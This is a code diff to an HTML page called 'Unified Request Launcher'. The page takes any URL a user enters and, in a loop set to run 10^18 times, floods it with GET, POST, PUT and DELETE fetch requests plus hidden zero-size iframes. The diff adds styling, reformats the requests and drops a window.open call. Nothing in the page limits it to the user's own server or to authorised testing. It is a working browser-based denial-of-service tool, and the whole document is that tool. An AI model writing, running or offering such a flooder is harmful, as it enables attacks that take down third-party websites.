@@ -3,6 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <title>Unified Request Launcher</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Consolas, monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    input {
+      width: 400px;
+      padding: 8px;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 8px 16px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #7cfc00;
+    }
+  </style>
 </head>
 <body>
   <h2>Request a Website</h2>
@@ -11,8 +39,8 @@
   <div id="status"></div>
 
   <script>
-    // Hard-coded knob: change this number directly in the code
-    const REQUEST_COUNT = 1000000000000000000000; // how many times each type of request is sent
+    // 🔧 Hard-coded knob: change this number directly in the code
+    const REQUEST_COUNT = 1000000000000000000; // how many times each type of request is sent
 
     function sendAll() {
       const url = document.getElementById('urlInput').value.trim();
@@ -21,7 +49,7 @@
         return;
       }
 
-      let total = REQUEST_COUNT * 6; // GET, POST, PUT, DELETE, iframe, window.open
+      let total = REQUEST_COUNT * 5; // GET, POST, PUT, DELETE, iframe
       let sent = 0;
 
       function updateStatus() {
@@ -30,22 +58,37 @@
       }
 
       for (let i = 0; i < REQUEST_COUNT; i++) {
-        // HTTP requests
-        fetch(url, { method: 'GET', mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
-        fetch(url, { method: 'POST', body: JSON.stringify({ test: "post" }), headers: { "Content-Type": "application/json" }, mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
-        fetch(url, { method: 'PUT', body: JSON.stringify({ test: "put" }), headers: { "Content-Type": "application/json" }, mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
-        fetch(url, { method: 'DELETE', mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
+        // GET
+        fetch(url, { method: 'GET', mode: 'no-cors' })
+          .finally(() => { sent++; updateStatus(); });
 
-        // Web requests (visible loads)
+        // POST
+        fetch(url, {
+          method: 'POST',
+          body: JSON.stringify({ test: "post" }),
+          headers: { "Content-Type": "application/json" },
+          mode: 'no-cors'
+        }).finally(() => { sent++; updateStatus(); });
+
+        // PUT
+        fetch(url, {
+          method: 'PUT',
+          body: JSON.stringify({ test: "put" }),
+          headers: { "Content-Type": "application/json" },
+          mode: 'no-cors'
+        }).finally(() => { sent++; updateStatus(); });
+
+        // DELETE
+        fetch(url, { method: 'DELETE', mode: 'no-cors' })
+          .finally(() => { sent++; updateStatus(); });
+
+        // Web request via hidden iframe
         const iframe = document.createElement('iframe');
         iframe.src = url;
         iframe.style.width = "0";
         iframe.style.height = "0";
         iframe.style.border = "none";
         document.body.appendChild(iframe);
-        sent++; updateStatus();
-
-        window.open(url, "_blank");
         sent++; updateStatus();
       }
     }
